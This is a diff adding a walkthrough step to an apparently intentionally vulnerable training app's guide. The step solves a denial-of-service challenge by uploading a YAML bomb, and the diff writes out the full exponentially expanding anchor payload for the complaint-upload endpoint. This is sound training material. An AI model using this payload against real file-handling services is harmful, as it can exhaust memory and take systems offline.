@@ -2190,6 +2190,32 @@ DoS your Juice Shop server.
 . If your request successfully bumped into the infinite loop
 protection, the challenge is marked as solved.
 
+=== Drop some explosive data into a vulnerable file-handling endpoint
+
+. Solve the
+<<_use_a_deprecated_b2b_interface_that_was_not_properly_shut_down,Use a deprecated B2B interface that was not properly shut down>>
+challenge.
+. Prepare a https://github.com/dubniczky/Yaml-Bomb[YAML bomb] payload file which expands into a huge file when parsed due to the exponentially used references of variables, for example:
+
+[,yaml]
+----
+a: &a [_,_,_,_,_,_,_,_,_,_,_,_,_,_,_]
+b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a,*a]
+c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b,*b]
+d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c,*c]
+e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d,*d]
+f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e,*e]
+g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f,*f]
+h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g,*g]
+i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h,*h]
+----
+
+[start=3]
+. Upload this file through the _File Complaint_ dialog and observe how
+the request processing takes up to 2 seconds and then times out (to
+prevent you from actually DoS'ing your application) but still solving
+the challenge.
+
 === Reset the password of Bjoern's internal account via the Forgot Password mechanism
 
 . Trying to find out who "Bjoern" might be should quickly lead you to
